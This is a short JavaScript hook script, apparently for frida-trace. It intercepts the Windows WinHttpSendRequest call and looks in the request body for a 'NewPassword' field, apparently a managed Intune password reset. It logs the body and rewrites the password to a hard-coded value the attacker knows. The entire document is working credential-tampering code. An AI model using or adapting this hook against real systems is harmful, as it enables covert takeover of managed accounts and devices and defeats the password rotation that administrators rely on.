defineHandler({
    onEnter(log, args, state) {
        log('[SET] WinHttpSendRequest');

        const s = args[3].readAnsiString();

        if (s.includes("NewPassword")) {
            log(s);

            const key = '"NewPassword":"';
            const start = s.indexOf(key) + key.length;
            const end = s.indexOf('"', start);

            if (start === -1 || end === -1) {
                log(" --> Could not find password boundaries in the string.");
                return;
            }

            const newPassword = "HelloIntune";
            const updatedString = s.substring(0, start) + newPassword + s.substring(end);

            log(`New password: ${newPassword}`);
            log(`Updated string: ${updatedString}`);

            try {
                args[3].writeAnsiString(updatedString);
            } catch (err) {
                log(` --> Failed to write updated string: ${err.message}`);
            }
        }
    },

    onLeave(log, retval, state) {
        // No operation
    }
});
